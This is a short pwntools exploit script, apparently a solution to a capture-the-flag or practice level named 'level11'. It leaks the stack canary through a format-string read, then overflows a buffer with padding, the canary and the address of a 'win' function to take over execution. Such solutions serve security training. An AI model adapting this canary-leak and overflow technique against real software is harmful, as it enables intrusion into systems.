#! /usr/bin/python3
from pwn import *

context.update(os = 'linux', arch = 'i386')

canary_loc = 13
offset_can = 20
DEBUG = False    
gs = '''
b main
set context-sections disasm stack
continue
'''
if DEBUG:
    r = gdb.debug("./level11", gdbscript = gs)
else:
    r = process("./level11")

elf = ELF("./level11")

r.sendline(f"%{canary_loc}$p")

r.recvuntil(": ")
canary_leak = int(r.recvline().decode(),16)
log.info(f"canary = 0x{canary_leak:02x}")
r.sendline(b"A" * offset_can + p32(canary_leak) + p32(elf.sym.win))


r.interactive()

